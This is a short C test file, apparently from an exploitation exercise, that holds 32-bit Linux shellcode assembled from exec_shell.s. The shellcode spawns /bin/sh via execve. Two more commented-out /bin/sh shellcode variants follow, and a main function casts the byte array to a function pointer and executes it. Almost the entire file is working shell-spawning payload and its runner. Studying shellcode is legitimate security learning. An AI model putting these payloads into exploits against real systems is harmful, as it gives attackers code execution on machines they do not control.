/**
* @file exec_shell.c
* @author Philip Wiese
* @date 29 Sep 2016
* @brief Test Code for exec_shell.s
*
* shellcode generiert aus <exec_shell.s> mit 
* #> nasm exec_shell.s
* #> hexdump -v -e '"\\x" 1/1 "%02x" ""' exec_shell; echo
*
*/

#include <stdio.h>
#include <string.h>

char shellcode[] =
"\xeb\x16\x5b\x31\xc0\x88\x43\x07"
"\x89\x5b\x08\x89\x43\x0c\x8d\x4b"
"\x08\x8d\x53\x0c\xb0\x0b\xcd\x80"
"\xe8\xe5\xff\xff\xff\x2f\x62\x69"
"\x6e\x2f\x73\x68";

/*
char shellcode1[] =
"\x31\x0c\x31\xdb\x31\xc9\x99\xb8"
"\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";
*/
/*
char shellcode2[] =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
"\x53\x89\xe1\xb0\x0b\xcd\x80";
*/

int main(int argc, char *argv[]) {
	printf("Length: %d\n", strlen(shellcode));
	int (*func) ();
	func = ( int(*)()) shellcode;
	(int) (*func)();
	return 0;
}
